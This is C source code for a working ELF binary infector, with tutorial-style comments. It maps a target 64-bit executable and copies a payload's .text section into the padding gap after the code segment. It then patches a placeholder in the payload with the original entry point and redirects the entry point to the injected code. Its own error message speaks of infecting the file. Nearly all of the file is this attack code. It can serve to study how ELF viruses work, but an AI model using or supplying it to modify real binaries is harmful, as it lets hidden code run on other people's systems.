#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <elf.h>
#include <sys/mman.h>

int 
get_file_size(int fd)
{
   struct stat _info;
   fstat (fd, &_info);
   return _info.st_size;
}

int
elfi_open_and_map(char *fname, void **data, int *len)
{
   int   size;
   int   fd;

   if ((fd = open(fname, O_APPEND | O_RDWR, 0)) < 0)
   {
      perror("open:");
      exit(1);
   }

   size = get_file_size(fd);
   if ((*data = mmap (0, size, PROT_READ | PROT_WRITE | PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
   {
      perror ("mmap:");
      exit (1);
   }

   printf ("+ File '%s' mapped (%d bytes ) at %p\n", fname, size, data);
   *len = size;
   return fd;
}

/* PT_LOAD segments are those that are directly loaded from the file. Other segments like the ones 
   containing the stack or the .bss section are not stored in the file, 
   but the code and static data have to be there and the PT_LOAD type is the way the system knows that 
   the data in the file has to be loaded in memory. 
*/
Elf64_Phdr *
elfi_find_gap(void *d, int fsize, int *p, int *len)
{
   Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *)d;
   Elf64_Phdr *elf_seg, *text_seg;
   int         n_seg = elf_hdr->e_phnum;
   int         text_end, gap = fsize;

   /* start checking the segments. */
   elf_seg = (Elf64_Phdr *)((unsigned char *)elf_hdr + (unsigned int) elf_hdr->e_phoff);

   for (int i = 0; i < n_seg; i++)
   {
      /* First we look for a segment of type PT_LOAD with execution permissions.
         Normally there is only one, and it is the one containing the .text section, 
         and therefore the application code. 
      */
      if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
      {
         printf("+ Found .text segment (#%d)\n", i);
         text_seg = elf_seg;
         text_end = elf_seg->p_offset + elf_seg->p_filesz;
      }
      else 
      {
         /* Then we keep looking for PT_LOAD segments and we calculate the gap with respect to the current 
            executable segment we have already found, and we store the one with the smallest gap. 
         */
         if (elf_seg->p_type == PT_LOAD && (elf_seg->p_offset - text_end) < gap)
         {
            printf("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n", i, (unsigned int)elf_seg->p_offset);
            gap = elf_seg->p_offset - text_end;
         }
      }
      elf_seg = (Elf64_Phdr *)((unsigned char *)elf_seg + (unsigned int)elf_hdr->e_phentsize);
   }
   *p = text_end;
   *len = gap;
   printf ("+ .text segment gap at offset 0x%x (0x%x bytes available)\n", text_end, gap);
   return text_seg;
}

/*
   In order to find a section by name, we have to access to the symbol table in the ELF file. 
   That table stores all the symbols required by the executable. Section names, external libraries, 
   relocation symbols names,… Everything that is a human readable string.
   The section list in the ELF file stores the section name as an index in the symbol table. 
   So, despite of all that pointer gymnastics, the function is just looping through the section list, 
   retrieving the name using the information there, and comparing that string with the passed parameter.
*/
Elf64_Shdr *
elfi_find_section(void *data, char *name)
{
   Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *)data;
   Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
   Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
   const char *const sh_strtab_p = data + sh_strtab->sh_offset;

   printf("+ %d section in file. Looking for section '%s'\n",
      elf_hdr->e_shnum, name);

   for (int i = 0; i < elf_hdr->e_shnum; i++)
   {
      char *sname = (char *) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp(sname, name)) return &shdr[i];
   }
   return NULL;
}

int
elfi_mem_subst(void *m, int len, long pat, long val)
{
   unsigned char *p = (unsigned char *)m;
   long  v;
   int   r;

   for (int i = 0; i < len; i++)
   {
      v = *((long *)(p + i));
      r = v ^pat;

      if (r == 0)
      {
         printf("+ Pattern %lx found at offset %d -> %lx\n", pat, i, val);
         *((long *)(p + i)) = val;
         return 0;
      }
   }
   return -1;
}

int
main(int argc, char **argv)
{
   void         *d, *d1;
   int          fsize, fsize1, p, len;

   if (argc != 3)
   {
      fprintf(stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
      exit(1);
   }

   /* PROCESS TARGET */
   /* Open and map target ELF and payload */
   int target_fd = elfi_open_and_map(argv[1], &d, &fsize);

   /* Get Application Entry point */
   Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *) d;
   Elf64_Addr ep = elf_hdr->e_entry;
   printf ("+ Target Entry point: %p\n", (void*) ep);

   Elf64_Phdr  *t_text_seg = elfi_find_gap(d, fsize, &p, &len);
   Elf64_Addr  base = t_text_seg->p_vaddr;
   printf ("+ Base Address : %p\n", (void*)base);

   /* PROCESS PAYLOAD */
   int payload_fd = elfi_open_and_map(argv[2], &d1, &fsize1);
   Elf64_Shdr *p_text_sec = elfi_find_section(d1, ".text");

   /* XXX: Looks like we do not really have to patch the segment sizes */
   /*
      t_text_seg->p_filesz += p_text_sec->sh_size;
      t_text_seg->p_memsz += p_text_sec->sh_size;
   */
   printf ("+ Payload .text section found at %lx (%lx bytes)\n", 
      p_text_sec->sh_offset, p_text_sec->sh_size);

   if (p_text_sec->sh_size > len)
   {
      fprintf(stderr, " - Payload is too big, cannot infect file\n");
      exit(1);
   }
   
   /* Copy payload in the segment padding area */
   memmove(d + p, d1 + p_text_sec->sh_offset, p_text_sec->sh_size);

   /* Patch return address */
   elfi_mem_subst(d + p, p_text_sec->sh_size, 0x11111111, (long)ep);

   /* Patch entry point */
   elf_hdr->e_entry = (Elf64_Addr) (base + p);
   
   /* Close files and actually update target file */
   close(payload_fd);
   close(target_fd);

   return 0;
}